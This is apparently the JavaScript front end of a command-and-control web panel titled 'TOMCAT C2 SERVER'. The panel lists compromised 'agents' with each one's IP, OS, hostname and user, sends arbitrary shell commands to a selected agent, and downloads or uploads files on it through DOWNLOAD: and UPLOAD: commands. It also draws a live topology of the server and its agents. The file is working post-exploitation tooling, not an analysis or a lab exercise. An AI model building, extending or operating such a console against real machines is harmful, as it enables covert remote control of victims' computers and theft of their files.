let serverRunning = false;
let selectedAgentId = null;
let agents = {};
let pollInterval = null;

// Show All Section In Sidebar Menu
function showSection(sectionName, event) {
    document.querySelectorAll(".section").forEach(section => {
        section.classList.remove("active");
    });
    const targetSection = document.getElementById(sectionName);
    if (targetSection) {
        targetSection.classList.add("active");
    }
    document.querySelectorAll(".nav-item").forEach(item => {
        item.classList.remove("active");
    });
    if (event && event.target) {
        const navItem = event.target.closest(".nav-item");
        if (navItem) {
            navItem.classList.add("active");
        }
    }
    const titles = {
        dashboard: "Dashboard",
        server: "Server Configuration",
        agents: "Connected Agents",
        command: "Command Console",
        logs: "Activity Logs",
        about: "About Developer"
    };
    document.getElementById("pageTitle").textContent = titles[sectionName] || "Dashboard";
    if (sectionName === 'agents') {
        updateTopology();
    }
    // Close Mobile Sidebar After Selecting Menu
    const sidebar = document.getElementById("sidebar");
    const overlay = document.getElementById("mobileOverlay");
    if (sidebar && sidebar.classList.contains("mobile-open")) {
        sidebar.classList.remove("mobile-open");
        overlay.classList.remove("active");
    }
}
// Toggle Sidebar Menu For Mobile
function toggleMobileMenu() {
    const sidebar = document.getElementById("sidebar");
    const overlay = document.getElementById("mobileOverlay");
    sidebar.classList.toggle("mobile-open");
    overlay.classList.toggle("active");
}
// Server Action Toggle
function toggleServer() {
    if (serverRunning) {
        stopServer();
    } else {
        startServer();
    }
}
// Start Server
async function startServer() {
    const host = document.getElementById("host").value;
    const port = document.getElementById("port").value;
    try {
        const response = await fetch("/api/server/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ Host: host, Port: port })
        });
        const data = await response.json();
        if (data.Success) {
            serverRunning = true;
            updateServerStatus({
                status: "Online",
                host: data.Host,
                port: data.Port,
                key: data.Key
            });
            startPolling();
        } else {
            alert("Error: " + data.Message);
        }
    } catch (error) {
        console.error("Error starting server:", error);
        alert("Failed to start server");
    }
}
// Stop Server
async function stopServer() {
    try {
        const response = await fetch("/api/server/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            }
        });
        const data = await response.json();
        if (data.Success) {
            serverRunning = false;
            updateServerStatus({ status: "Offline" });
            stopPolling();
            clearAgents();
        }
    } catch (error) {
        console.error("Error stopping server:", error);
    }
}
// Update Server Status
function updateServerStatus(data) {
    const sphere = document.getElementById("statusSphere");
    const sphereStatusText = document.getElementById("sphereStatusText");
    const sphereStatusDetail = document.getElementById("sphereStatusDetail");
    if (data.status === "Online") {
        document.getElementById("dashServerStatus").textContent = "Online";
        document.getElementById("serverAddress").textContent = `${data.host}:${data.port}`;
        document.getElementById("sessionKey").textContent = data.key.substring(0, 32) + "...";
        if (data.uptime) {
            document.getElementById("dashUptime").textContent = data.uptime;
        }
        sphere.classList.add("Online");
        sphereStatusText.textContent = "Online";
        sphereStatusText.classList.add("Online");
        sphereStatusDetail.textContent = `Listening on ${data.host}:${data.port}`;
        const btn = document.getElementById("topbarServerBtn");
        btn.innerHTML = '<i class="fas fa-stop"></i><span>Stop Server</span>';
        btn.classList.add("btn-danger");
        document.getElementById("startServerBtn").innerHTML = '<i class="fas fa-stop"></i> Stop Server';
        document.getElementById("startServerBtn").classList.add("btn-danger");
    } else if (data.status === "Offline") {
        document.getElementById("dashServerStatus").textContent = "Offline";
        document.getElementById("dashAgentCount").textContent = "0";
        document.getElementById("dashConnections").textContent = "0";
        document.getElementById("dashUptime").textContent = "00:00:00";
        document.getElementById("serverAddress").textContent = "XXX.XXX.XXX.XXX";
        document.getElementById("sessionKey").textContent = "XXXXXXXXXXXX";
        sphere.classList.remove("Online");
        sphereStatusText.textContent = "Offline";
        sphereStatusText.classList.remove("Online");
        sphereStatusDetail.textContent = "Server not running";
        const btn = document.getElementById("topbarServerBtn");
        btn.innerHTML = '<i class="fas fa-play"></i><span>Start Server</span>';
        btn.classList.remove("btn-danger");
        document.getElementById("startServerBtn").innerHTML = '<i class="fas fa-play"></i> Start Server';
        document.getElementById("startServerBtn").classList.remove("btn-danger");
    }
}
// Count Server Running Interval
function startPolling() {
    if (pollInterval) {
        clearInterval(pollInterval);
    }
    pollInterval = setInterval(async () => {
        await refreshServerStatus();
        await refreshAgents();
        await refreshLogs();
    }, 1000);
}
// Stop Counting Server Interval
function stopPolling() {
    if (pollInterval) {
        clearInterval(pollInterval);
        pollInterval = null;
    }
}
// Refresh Server Status
async function refreshServerStatus() {
    try {
        const response = await fetch("/api/server/status");
        const data = await response.json();
        if (data.Status === "Online") {
            if (data.Uptime) {
                document.getElementById("dashUptime").textContent = data.Uptime;
            }
            updateAgentCount(data.Agents);
        } else {
            document.getElementById("dashUptime").textContent = "00:00:00";
        }
    } catch (error) {
        console.error("Error fetching server status:", error);
    }
}
// Refresh Agent List
async function refreshAgents() {
    try {
        const response = await fetch("/api/agents");
        const data = await response.json();
        const currentAgentIds = new Set(Object.keys(agents).map(id => parseInt(id)));
        const newAgentIds = new Set(data.Agents.map(a => a.ID));
        const addedAgents = data.Agents.filter(a => !currentAgentIds.has(a.ID));
        const removedAgentIds = [...currentAgentIds].filter(id => !newAgentIds.has(id));
        addedAgents.forEach(agent => addAgent(agent));
        removedAgentIds.forEach(id => removeAgent(id));
    } catch (error) {
        console.error("Error fetching agents:", error);
    }
}
// Refresh Logging
async function refreshLogs() {
    try {
        const response = await fetch("/api/logs");
        const data = await response.json();
        const logOutput = document.getElementById("logOutput");
        const newContent = formatLogOutput(data.Logs.join("\n"));
        if (logOutput.innerHTML !== newContent) {
            const wasAtBottom = logOutput.scrollHeight - logOutput.scrollTop === logOutput.clientHeight;
            logOutput.innerHTML = newContent;
            if (wasAtBottom) {
                logOutput.scrollTop = logOutput.scrollHeight;
            }
        }
    } catch (error) {
        console.error("Error fetching logs:", error);
    }
}
// Add Agent Card
function addAgent(agent) {
    if (agents[agent.ID]) {
        return;
    }
    agents[agent.ID] = agent;
    const container = document.getElementById("agentsContainer");
    const agentCard = document.createElement("div");
    agentCard.className = "Agent-card connected";
    agentCard.id = `Agent-${agent.ID}`;
    agentCard.onclick = () => selectAgent(agent.ID);
    agentCard.innerHTML = `
        <div class="Agent-header">
            <div class="Agent-id">${(agent.AgentName || `Agent-${agent.ID}`).toUpperCase()}</div>
            <div class="Agent-status">
                <i class="fas fa-circle"></i>
                <span>ACTIVE</span>
            </div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-network-wired"></i>
            <div class="Agent-detail-label">Agent IP:</div>
            <div class="Agent-detail-value">${agent.AgentIP}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-plug"></i>
            <div class="Agent-detail-label">Connect:</div>
            <div class="Agent-detail-value">${agent.Address}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-desktop"></i>
            <div class="Agent-detail-label">OS:</div>
            <div class="Agent-detail-value">${agent.OS}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-server"></i>
            <div class="Agent-detail-label">Host:</div>
            <div class="Agent-detail-value">${agent.Hostname}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-user"></i>
            <div class="Agent-detail-label">User:</div>
            <div class="Agent-detail-value">${agent.User}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-microchip"></i>
            <div class="Agent-detail-label">Arch:</div>
            <div class="Agent-detail-value">${agent.Arch}</div>
        </div>
        <div class="Agent-detail">
            <i class="fas fa-clock"></i>
            <div class="Agent-detail-label">Time:</div>
            <div class="Agent-detail-value">${agent.JoinedAt}</div>
        </div>
    `;
    container.appendChild(agentCard);
    document.getElementById("noAgents").style.display = "none";
    updateAgentCount(Object.keys(agents).length);
}
// Remove Disconnected Agent From List
function removeAgent(agentId) {
    delete agents[agentId];
    const agentCard = document.getElementById(`Agent-${agentId}`);
    if (agentCard) {
        agentCard.remove();
    }
    if (Object.keys(agents).length === 0) {
        document.getElementById("noAgents").style.display = "block";
    }
    if (selectedAgentId === agentId) {
        selectedAgentId = null;
        document.getElementById("selectedAgent").textContent = "None";
        document.getElementById("selectedAgent").style.background = "var(--danger)";
    }
    updateAgentCount(Object.keys(agents).length);
}
// Clear Agent List
function clearAgents() {
    agents = {};
    document.getElementById("agentsContainer").innerHTML = "";
    document.getElementById("noAgents").style.display = "block";
    updateAgentCount(0);
    selectedAgentId = null;
    document.getElementById("selectedAgent").textContent = "None";
    document.getElementById("selectedAgent").style.background = "var(--danger)";
}
// Update Agent Count
function updateAgentCount(count) {
    document.getElementById("navAgentCount").textContent = count;
    document.getElementById("agentCount").textContent = count;
    document.getElementById("agentCount2").textContent = count;
    document.getElementById("dashAgentCount").textContent = count;
    document.getElementById("dashConnections").textContent = count;
    updateTopology();
}
// Agent Selection
function selectAgent(agentId) {
    selectedAgentId = agentId;
    document.querySelectorAll(".Agent-card").forEach(card => {
        card.classList.remove("selected");
    });
    document.getElementById(`Agent-${agentId}`).classList.add("selected");
    const agent = agents[agentId];
    const displayName = (agent && agent.AgentName) ? agent.AgentName : `Agent-${agentId}`;
    document.getElementById("selectedAgent").textContent = displayName.toUpperCase();
    document.getElementById("selectedAgent").style.background = "var(--success)";
}
// Execute Command
async function executeCommand() {
    if (!selectedAgentId) {
        alert("Please select an agent first!");
        return;
    }
    const command = document.getElementById("cmdInput").value.trim();
    if (!command) {
        return;
    }
    appendToOutput(`[+] Executing: ${command}`, "command");
    document.getElementById("cmdInput").value = "";
    try {
        const response = await fetch("/api/command/execute", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                AgentId: selectedAgentId,
                Command: command
            })
        });
        const data = await response.json();
        if (data.Success) {
            appendToOutput("[+] Output:", "success");
            appendToOutput(data.Output, "output");
        } else {
            appendToOutput(`[!] Error: ${data.Output}`, "error");
        }
    } catch (error) {
        console.error("Error executing command:", error);
        appendToOutput("[!] Error: Failed to execute command", "error");
    }
}
// Quick Command
async function quickCommand(command) {
    if (!selectedAgentId) {
        alert("Please select an agent first!");
        return;
    }
    appendToOutput(`[+] Executing: ${command}`, "command");
    try {
        const response = await fetch("/api/command/execute", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                AgentId: selectedAgentId,
                Command: command
            })
        });
        const data = await response.json();
        if (data.Success) {
            appendToOutput("[+] Output:", "success");
            appendToOutput(data.Output, "output");
        } else {
            appendToOutput(`[!] Error: ${data.Output}`, "error");
        }
    } catch (error) {
        console.error("Error executing command:", error);
        appendToOutput("[!] Error: Failed to execute command", "error");
    }
}
// Output Styles
function appendToOutput(text, type = "output") {
    const output = document.getElementById("cmdOutput");
    const line = document.createElement("div");
    switch (type) {
        case "command":
            line.style.color = "#00d4ff";
            break;
        case "success":
            line.style.color = "#00ff00";
            break;
        case "error":
            line.style.color = "#ff3b30";
            break;
        case "separator":
            line.style.color = "#0040ff";
            line.style.fontWeight = "bold";
            break;
        case "output":
        default:
            line.style.color = "#ffffff";
            break;
    }
    line.textContent = text;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}
// Clear Command Output
function clearCommandOutput() {
    document.getElementById("cmdOutput").innerHTML = "";
}
// Copy Command Output
function copyCommandOutput(event) {
    const output = document.getElementById("cmdOutput");
    const text = output.innerText || output.textContent;
    if (!text || text.trim() === "") {
        alert("No output to copy!");
        return;
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            const btn = event.target.closest("button");
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i> <span>Copied!</span>';
            btn.style.borderColor = "var(--success)";
            btn.style.color = "var(--success)";
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.borderColor = "";
                btn.style.color = "";
            }, 2000);
        }).catch(err => {
            fallbackCopy(text, event);
        });
    } else {
        fallbackCopy(text, event);
    }
}
// Copy Logging History
function copyLogs(event) {
    const logOutput = document.getElementById("logOutput");
    const text = logOutput.innerText || logOutput.textContent;
    if (!text || text.trim() === "") {
        alert("No logs to copy!");
        return;
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            const btn = event.target.closest("button");
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i> <span>Copied!</span>';
            btn.style.borderColor = "var(--success)";
            btn.style.color = "var(--success)";
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.borderColor = "";
                btn.style.color = "";
            }, 2000);
        }).catch(err => {
            fallbackCopy(text, event);
        });
    } else {
        fallbackCopy(text, event);
    }
}
// Copy Area
function fallbackCopy(text, event) {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.style.position = "fixed";
    textarea.style.top = "0";
    textarea.style.left = "0";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    textarea.setSelectionRange(0, 99999);
    try {
        const successful = document.execCommand("copy");
        if (successful) {
            const btn = event.target.closest("button");
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i> <span>Copied!</span>';
            btn.style.borderColor = "var(--success)";
            btn.style.color = "var(--success)";
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.borderColor = "";
                btn.style.color = "";
            }, 2000);
        } else {
            alert("Failed to copy output");
        }
    } catch (err) {
        alert("Failed to copy output");
        console.error("Copy error:", err);
    }
    document.body.removeChild(textarea);
}
// Logs Output Formatting
function formatLogOutput(text) {
    if (!text) return "";
    const lines = text.split("\n");
    let formatted = "";
    lines.forEach(line => {
        if (line.includes("_____")) {
            formatted += `<div style="color: #00ff88; font-weight: bold;">${escapeHtml(line)}</div>`;
        } else if (line.includes("[+]")) {
            formatted += `<div style="color: #00ff88;">${escapeHtml(line)}</div>`;
        } else if (line.includes("[!]") || line.includes("Error")) {
            formatted += `<div style="color: #ff3b30;">${escapeHtml(line)}</div>`;
        } else if (line.includes("[*]")) {
            formatted += `<div style="color: #00d4ff;">${escapeHtml(line)}</div>`;
        } else {
            formatted += `<div style="color: #ffffff;">${escapeHtml(line)}</div>`;
        }
    });
    return formatted;
}
// HTML Chars Escape
function escapeHtml(text) {
    const map = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#039;"
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}
// Enter Observer
function handleCommandEnter(event) {
    if (event.key === "Enter") {
        executeCommand();
    }
}
// Clear Logs
async function clearLogs() {
    try {
        await fetch("/api/logs/clear", {
            method: "POST"
        });
        document.getElementById("logOutput").innerHTML = "";
    } catch (error) {
        console.error("Error clearing logs:", error);
    }
}
// Agent Connection To Server Design Topology
function updateTopology() {
    const svg = document.getElementById("topologySvg");
    if (!svg) return;
    const container = svg.parentElement;
    const width = container.clientWidth;
    const height = 400;
    svg.setAttribute("width", width);
    svg.setAttribute("height", height);
    svg.innerHTML = "";
    // Add SVG Gradients and Defs
    const defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
    // Server Gradient
    const serverGradient = document.createElementNS("http://www.w3.org/2000/svg", "linearGradient");
    serverGradient.setAttribute("id", "serverGradient");
    serverGradient.setAttribute("x1", "0%");
    serverGradient.setAttribute("y1", "0%");
    serverGradient.setAttribute("x2", "100%");
    serverGradient.setAttribute("y2", "100%");
    serverGradient.innerHTML = `
        <stop offset="0%" style="stop-color:#0066ff;stop-opacity:1" />
        <stop offset="100%" style="stop-color:#0052cc;stop-opacity:1" />
    `;
    defs.appendChild(serverGradient);
    // Agent Online Gradient
    const agentGradient = document.createElementNS("http://www.w3.org/2000/svg", "linearGradient");
    agentGradient.setAttribute("id", "agentGradient");
    agentGradient.setAttribute("x1", "0%");
    agentGradient.setAttribute("y1", "0%");
    agentGradient.setAttribute("x2", "100%");
    agentGradient.setAttribute("y2", "100%");
    agentGradient.innerHTML = `
        <stop offset="0%" style="stop-color:#00c853;stop-opacity:1" />
        <stop offset="100%" style="stop-color:#00a843;stop-opacity:1" />
    `;
    defs.appendChild(agentGradient);
    // Agent Offline Gradient
    const offlineGradient = document.createElementNS("http://www.w3.org/2000/svg", "linearGradient");
    offlineGradient.setAttribute("id", "offlineGradient");
    offlineGradient.setAttribute("x1", "0%");
    offlineGradient.setAttribute("y1", "0%");
    offlineGradient.setAttribute("x2", "100%");
    offlineGradient.setAttribute("y2", "100%");
    offlineGradient.innerHTML = `
        <stop offset="0%" style="stop-color:#6b7280;stop-opacity:1" />
        <stop offset="100%" style="stop-color:#4b5563;stop-opacity:1" />
    `;
    defs.appendChild(offlineGradient);
    svg.appendChild(defs);
    const serverX = width / 2;
    const serverY = height / 2;
    const agentList = Object.values(agents);
    const agentCount = agentList.length;
    // Draw connection lines first (so they appear behind nodes)
    if (agentCount > 0) {
        const radius = Math.min(width, height) * 0.35;
        const angleStep = (2 * Math.PI) / agentCount;
        agentList.forEach((agent, index) => {
            const angle = index * angleStep - Math.PI / 2;
            const x = serverX + radius * Math.cos(angle);
            const y = serverY + radius * Math.sin(angle);
            // Draw glow line
            const glowLine = document.createElementNS("http://www.w3.org/2000/svg", "line");
            glowLine.setAttribute("x1", serverX);
            glowLine.setAttribute("y1", serverY);
            glowLine.setAttribute("x2", x);
            glowLine.setAttribute("y2", y);
            glowLine.setAttribute("class", "connection-glow");
            svg.appendChild(glowLine);
            // Draw main connection line
            const line = document.createElementNS("http://www.w3.org/2000/svg", "line");
            line.setAttribute("x1", serverX);
            line.setAttribute("y1", serverY);
            line.setAttribute("x2", x);
            line.setAttribute("y2", y);
            line.setAttribute("class", agent.Status === "Online" ? "connection-line" : "connection-line offline");
            svg.appendChild(line);
            // Add animated data packets on lines
            if (agent.Status === "Online" && serverRunning) {
                createDataPacket(svg, serverX, serverY, x, y, index * 0.2);
            }
        });
    }
    // Add pulse rings around server if running
    if (serverRunning) {
        for (let i = 0; i < 5; i++) {
            const pulseRing = document.createElementNS("http://www.w3.org/2000/svg", "circle");
            pulseRing.setAttribute("cx", serverX);
            pulseRing.setAttribute("cy", serverY);
            pulseRing.setAttribute("r", 40);
            pulseRing.setAttribute("class", "pulse-ring");
            pulseRing.style.animationDelay = `${i * 0.6}s`;
            svg.appendChild(pulseRing);
        }
    }
    // Draw server node
    drawEnhancedNode(svg, serverX, serverY, "TOMCAT C2 SERVER", serverRunning ? document.getElementById("serverAddress").textContent : "Offline", true);
    // Draw agent nodes
    if (agentCount > 0) {
        const radius = Math.min(width, height) * 0.35;
        const angleStep = (2 * Math.PI) / agentCount;
        agentList.forEach((agent, index) => {
            const angle = index * angleStep - Math.PI / 2;
            const x = serverX + radius * Math.cos(angle);
            const y = serverY + radius * Math.sin(angle);
            drawEnhancedNode(svg, x, y, (agent.AgentName || `Agent-${agent.ID}`).toUpperCase(), agent.AgentIP, false, agent.ID, agent.Status === "Online");
        });
    }
}
function createDataPacket(svg, x1, y1, x2, y2, delay) {
    const packet = document.createElementNS("http://www.w3.org/2000/svg", "circle");
    packet.setAttribute("r", 4);
    packet.setAttribute("class", "data-packet");
    const animate = document.createElementNS("http://www.w3.org/2000/svg", "animateMotion");
    animate.setAttribute("dur", "3s");
    animate.setAttribute("repeatCount", "indefinite");
    animate.setAttribute("begin", `${delay}s`);
    const path = document.createElementNS("http://www.w3.org/2000/svg", "mpath");
    const pathId = `path-${Math.random().toString(36).substr(2, 9)}`;
    const motionPath = document.createElementNS("http://www.w3.org/2000/svg", "path");
    motionPath.setAttribute("id", pathId);
    motionPath.setAttribute("d", `M ${x1} ${y1} L ${x2} ${y2}`);
    motionPath.setAttribute("fill", "none");
    motionPath.setAttribute("stroke", "none");
    svg.appendChild(motionPath);
    path.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", `#${pathId}`);
    animate.appendChild(path);
    packet.appendChild(animate);
    svg.appendChild(packet);
}
function drawEnhancedNode(svg, x, y, label, sublabel, isServer, agentId = null, isOnline = true) {
    const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
    g.setAttribute("class", isServer ? "topology-server" : "topology-agent");
    if (agentId) {
        g.onclick = () => selectAgent(agentId);
        g.style.cursor = "pointer";
    }
    // Main node circle
    const nodeCircle = document.createElementNS("http://www.w3.org/2000/svg", "circle");
    nodeCircle.setAttribute("cx", x);
    nodeCircle.setAttribute("cy", y);
    nodeCircle.setAttribute("r", isServer ? 35 : 28);
    nodeCircle.setAttribute("class", isServer ? "server-node" : (isOnline ? "Agent-node" : "Agent-node offline"));
    g.appendChild(nodeCircle);
    // Icon
    const foreignObject = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
    foreignObject.setAttribute("x", x - 20);
    foreignObject.setAttribute("y", y - 20);
    foreignObject.setAttribute("width", 40);
    foreignObject.setAttribute("height", 40);
    const iconDiv = document.createElement("div");
    iconDiv.style.width = "100%";
    iconDiv.style.height = "100%";
    iconDiv.style.display = "flex";
    iconDiv.style.alignItems = "center";
    iconDiv.style.justifyContent = "center";
    iconDiv.style.fontSize = isServer ? "24px" : "20px";
    iconDiv.style.gap = "50px";
    iconDiv.style.color = "#ffffff";
    iconDiv.innerHTML = `<i class="${isServer ? 'fas fa-server' : 'fas fa-laptop'}"></i>`;
    foreignObject.appendChild(iconDiv);
    g.appendChild(foreignObject);
    // Label
    const labelText = document.createElementNS("http://www.w3.org/2000/svg", "text");
    labelText.setAttribute("x", x);
    labelText.setAttribute("y", y + (isServer ? 50 : 45));
    labelText.setAttribute("text-anchor", "middle");
    labelText.setAttribute("class", isServer ? "server-label" : "Agent-label");
    labelText.textContent = label;
    g.appendChild(labelText);
    // Sublabel
    const sublabelText = document.createElementNS("http://www.w3.org/2000/svg", "text");
    sublabelText.setAttribute("x", x);
    sublabelText.setAttribute("y", y + (isServer ? 65 : 58));
    sublabelText.setAttribute("text-anchor", "middle");
    sublabelText.setAttribute("font-size", "9");
    sublabelText.setAttribute("fill", "#8b92a7");
    sublabelText.setAttribute("font-family", "JetBrains Mono, monospace");
    sublabelText.textContent = sublabel;
    g.appendChild(sublabelText);
    svg.appendChild(g);
}
function drawComputer(svg, x, y, label, sublabel, isServer, agentId = null) {
    const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
    g.setAttribute("class", "topology-computer");
    if (agentId) {
        g.onclick = () => selectAgent(agentId);
        g.style.cursor = "pointer";
    }
    const iconCircle = document.createElementNS("http://www.w3.org/2000/svg", "circle");
    iconCircle.setAttribute("cx", x);
    iconCircle.setAttribute("cy", y);
    iconCircle.setAttribute("r", 30);
    iconCircle.setAttribute("fill", isServer ? "#0066ff" : "#1e2433");
    iconCircle.setAttribute("stroke", isServer ? "#0052cc" : "#2a3041");
    iconCircle.setAttribute("stroke-width", 2);
    iconCircle.setAttribute("class", "computer-body");
    g.appendChild(iconCircle);
    const foreignObject = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
    foreignObject.setAttribute("x", x - 20);
    foreignObject.setAttribute("y", y - 20);
    foreignObject.setAttribute("width", 40);
    foreignObject.setAttribute("height", 40);
    const iconDiv = document.createElement("div");
    iconDiv.style.width = "100%";
    iconDiv.style.height = "100%";
    iconDiv.style.display = "flex";
    iconDiv.style.alignItems = "center";
    iconDiv.style.justifyContent = "center";
    iconDiv.style.fontSize = "24px";
    iconDiv.style.color = isServer ? "#ffffff" : "#8b92a7";
    iconDiv.innerHTML = `<i class="${isServer ? 'fas fa-server' : 'fas fa-laptop'}"></i>`;
    foreignObject.appendChild(iconDiv);
    g.appendChild(foreignObject);
    const labelText = document.createElementNS("http://www.w3.org/2000/svg", "text");
    labelText.setAttribute("x", x);
    labelText.setAttribute("y", y + 45);
    labelText.setAttribute("text-anchor", "middle");
    labelText.setAttribute("font-size", "11");
    labelText.setAttribute("font-weight", "700");
    labelText.setAttribute("fill", isServer ? "#0066ff" : "#ffffff");
    labelText.setAttribute("font-family", "JetBrains Mono, monospace");
    labelText.textContent = label;
    g.appendChild(labelText);
    const sublabelText = document.createElementNS("http://www.w3.org/2000/svg", "text");
    sublabelText.setAttribute("x", x);
    sublabelText.setAttribute("y", y + 58);
    sublabelText.setAttribute("text-anchor", "middle");
    sublabelText.setAttribute("font-size", "9");
    sublabelText.setAttribute("fill", "#8b92a7");
    sublabelText.setAttribute("font-family", "JetBrains Mono, monospace");
    sublabelText.textContent = sublabel;
    g.appendChild(sublabelText);
    svg.appendChild(g);
}
// File Download Function
async function downloadFile() {
    if (!selectedAgentId) {
        alert("Please select an agent first!");
        return;
    }
    const filePath = document.getElementById("advSourcePath").value.trim();
    if (!filePath) {
        alert("Please specify a source file path!");
        return;
    }
    appendToOutput(`[+] Downloading file: ${filePath}`, "command");
    try {
        const response = await fetch("/api/command/execute", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                AgentId: selectedAgentId,
                Command: `DOWNLOAD:${filePath}`
            })
        });
        const data = await response.json();
        if (data.Success) {
            appendToOutput("[+] Download completed", "success");
            appendToOutput(data.Output, "output");
            appendToOutput("_".repeat(60), "separator");
        } else {
            appendToOutput(`[!] Error: ${data.Output}`, "error");
        }
    } catch (error) {
        console.error("Error downloading file:", error);
        appendToOutput("[!] Error: Failed to download file", "error");
    }
}
// File Upload Function
async function uploadFile() {
    if (!selectedAgentId) {
        alert("Please select an agent first!");
        return;
    }
    const sourcePath = document.getElementById("advSourcePath").value.trim();
    const destPath = document.getElementById("advDestPath").value.trim();
    if (!sourcePath) {
        alert("Please specify a source file path!");
        return;
    }
    if (!destPath) {
        alert("Please specify a destination path!");
        return;
    }
    appendToOutput(`[+] Uploading file to: ${destPath}`, "command");
    appendToOutput(`[+] Source: ${sourcePath}`, "command");
    try {
        const response = await fetch("/api/command/execute", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                AgentId: selectedAgentId,
                Command: `UPLOAD:${sourcePath}|${destPath}`
            })
        });
        const data = await response.json();
        if (data.Success) {
            appendToOutput("[+] Upload completed", "success");
            appendToOutput(data.Output, "output");
            appendToOutput("_".repeat(60), "separator");
        } else {
            appendToOutput(`[!] Error: ${data.Output}`, "error");
        }
    } catch (error) {
        console.error("Error uploading file:", error);
        appendToOutput("[!] Error: Failed to upload file", "error");
    }
}
// Refresh Server Panel While Window Onload
window.onload = async () => {
    await refreshServerStatus();
    const response = await fetch("/api/server/status");
    const data = await response.json();
    if (data.Status === "Online") {
        serverRunning = true;
        updateServerStatus({
            status: "Online",
            host: data.Host,
            port: data.Port,
            key: data.Key,
            uptime: data.Uptime
        });
        startPolling();
    }
    updateTopology();
};